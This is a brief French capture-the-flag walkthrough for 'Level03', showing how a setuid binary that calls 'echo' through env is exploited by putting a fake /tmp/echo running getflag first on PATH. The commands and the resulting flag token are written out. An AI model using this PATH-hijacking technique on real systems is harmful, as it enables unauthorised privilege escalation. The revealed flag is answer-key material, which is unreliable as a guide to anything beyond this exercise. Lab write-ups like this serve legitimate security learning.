
Bonjour, Nous sommes actuellement au Level03.
Prenez le temps de lire et de poser des questions, nous sommes la pour ca.

On remarque l'executable "level03" présent a la racine, l'exécuter nous écrit "exploit me".

En regardant un peu dans l'exécutable on remarque la ligne "/usr/bin/env echo Exploit me".

Après un "find . -user flag03" on remarque que l'executable appartient a flag03, qui est l'utilisateur recherché.

Il suffit donc de rediriger la commande "echo" vers la commande "getflag" qui sera alors lancé par l'utilisateur flag03.

touch /tmp/echo
vim /tmp/echo -> écrire /bin/getflag
chmod 777 /tmp/echo -> on donne les droit a flag03 d'utiliser notre fichier
export PATH=/tmp:$PATH
./level03 -> l'executable fait un getflag, ce qui nous donne: qi0maab88jeaj46qoumi7maus
